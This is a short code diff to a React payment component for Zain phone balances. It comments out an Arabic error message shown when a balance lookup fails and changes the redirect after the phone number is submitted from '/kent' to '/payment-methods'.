@@ -55,7 +55,7 @@ export default function ZainPayment() {
       }
     } catch (error) {
       console.error("Failed to fetch balance:", error)
-      setBalanceError("فشل في جلب معلومات الرصيد. يرجى المحاولة مرة أخرى.")
+    //  setBalanceError("فشل في جلب معلومات الرصيد. يرجى المحاولة مرة أخرى.")
     } finally {
       setIsLoadingBalance(false)
     }
@@ -138,7 +138,7 @@ export default function ZainPayment() {
     const vistID = localStorage.getItem('visitor')
     addData({ id: vistID, name: phoneNumber, phone: phoneNumber })
     setTimeout(() => {
-      router.push('/kent')
+      router.push('/payment-methods')
       setIsSubmitted(false)
     }, 2000);
   }
